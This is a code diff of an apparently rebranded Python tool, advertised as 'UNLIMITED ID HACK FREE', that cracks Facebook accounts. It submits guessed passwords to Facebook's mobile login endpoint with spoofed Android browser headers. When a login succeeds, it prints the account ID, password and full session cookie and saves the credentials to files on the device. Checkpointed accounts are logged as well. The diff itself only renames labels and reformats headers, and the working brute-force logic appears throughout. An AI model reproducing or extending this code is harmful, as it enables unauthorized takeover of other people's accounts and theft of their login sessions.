@@ -105,7 +105,7 @@ logo =("""
 \x1b[0;34m UNLIMITED ID HACK FREE
 \x1b[0;34m Tools Type Free
 \x1b[0;34m Tools owner: nib noyon
-\x1b[0;34m version: 3.2
+\x1b[0;34m version: 3.3
  """)
  
 loop = 0
@@ -218,47 +218,47 @@ def rcrack(uid,pwx,tl):
             "login":"Log In"}
             
             header_freefb = {'authority': 'mbasic.facebook.com',
-    "method": 'GET',
-    "scheme": 'https',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    # 'cookie': 'datr=b9GIZk2RQiHuT6YruprlflYM; sb=b9GIZq_ee1a0g5dQ7_uVGL7N',
-    'dpr': '1.875',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"V2310"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"14.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': pro}
+            "method": 'GET',
+            "scheme": 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'dpr': '1.875',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"V2310"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"14.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro}
+
             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r \033[38;5;196m[\033[38;5;45mJONI-SING-OK🥵🔞\033[38;5;196m] \033[38;5;46m'+uid+'\033[38;5;196m | \033[38;5;46m' +ps+    '  \n\033[38;5;196m[\033[0;93m [\033[38;5;46mCOOKIE-🔰😭\033[38;5;196m] = \033[38;5;195m'+coki+  '  ''  \033[0;97m')
+                print('\r\r \033[38;5;196m[\033[38;5;45mnib-crack-OK🥵🔞\033[38;5;196m] \033[38;5;46m'+uid+'\033[38;5;196m | \033[38;5;46m' +ps+    '  \n\033[38;5;196m[\033[0;93m [\033[38;5;46mCOOKIE-🔰😭\033[38;5;196m] = \033[38;5;195m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/JONI-SING-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/nib-crack-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('\r\r\33[1;30m[JONI-SING-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/JONI-SING-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                print('\r\r\33[1;30m[nib-crack-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/nib-crack-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\r%s{x} [{xr}JONI-SING{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+        sys.stdout.write(f'\r\r%s{x} [{xr}nib-crack{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
         sys.stdout.flush()
     except:
         pass
